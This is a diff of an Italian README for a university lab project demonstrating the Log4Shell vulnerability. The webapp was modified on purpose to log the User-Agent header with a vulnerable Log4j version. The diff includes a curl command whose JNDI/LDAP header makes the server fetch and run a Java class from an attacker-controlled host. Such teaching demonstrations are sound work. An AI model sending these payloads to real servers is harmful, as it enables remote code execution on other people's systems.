@@ -1,10 +1,11 @@
 # Progetto sicurezza Informatica ICDA A.A 2021-2022
 
-Lo scopo di questo progetto è quello di mostrare la vulnerabilità Log4shell CVE-2021-44228 che affligge la libreria Java Log4j , impiegata da innumerevoli software di ogni tempo (programmi standard, giochi, webapp).
+Lo scopo di questo progetto è quello di mostrare la vulnerabilità Log4shell CVE-2021-44228 che affligge la libreria Java Log4j , impiegata da innumerevoli software di ogni tipo (programmi standard, giochi, webapp).
 
-In questo progetto è stata scelta una webapp spring (popolare web framework Java MVC), opportunamente modificata per lo scopo.
+In questo progetto è stata scelta una webapp realizzata con il popolare web framework Java MVC, opportunamente modificata per lo scopo.
 
-La parte da me modificata si trova nel controller "HomeController", file "HomeController.java"
+La parte da me modificata si trova nel controller "HomeController", file "HomeController.java".
+Nel controller è stata istanziata la classe Logger, ed è stata aggiunta (mediante annotazione) l'istruzione per ricavare l'header della richiesta "User-Agent", e all'interno del controller, si è usata l'istanza del Logger precedentemente istanziata  per loggare la User-Agent. Ne consegue quindi, che se un client invia una  richiesta al server con l'header opportunamente modificato (nel nostro caso la user agent, ma avrei potuto sceglierne un altro volendo), contenente un'istruzione per il download di una classe Java da un server JNDI, verrà eseguito il codice contenuto nella classe.
 
 La libreria impiegata di log4J 2.6.1.
 Nel progetto è presente il file pom.xml per la compilazione tramite Maven.
@@ -30,7 +31,7 @@ touch /tmp/hacked
 
 e includerlo (codificato in base64) in una richiesta da inviare al server della webApp. Si userà il comando Curl per lo scopo.
 
-Una volta inviato il comando, il metodo della libreria Log4j interpreterà il comando, sarà scaricata ed eseguita  una classe Java dal server LDAP (controllato dall'attaccante)  e successivamente avverrà l'esecuzuzione del payload, contenuto all'interno della classe Java scaricata nel passo precedente. Esempio di comando valido:
+Una volta inviato il comando, il metodo della libreria Log4j invocato nel controller, interpreterà il comando, sarà scaricata ed eseguita  una classe Java dal server JNDI (controllato dall'attaccante)  e successivamente avverrà l'esecuzuzione del payload, contenuto all'interno della classe Java scaricata nel passo precedente. Esempio di comando valido:
 
 ```bash
 curl -A '${jndi:ldap://192.168.10.128:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9oYWNrZWQ=}' http://172.18.0.2:8080
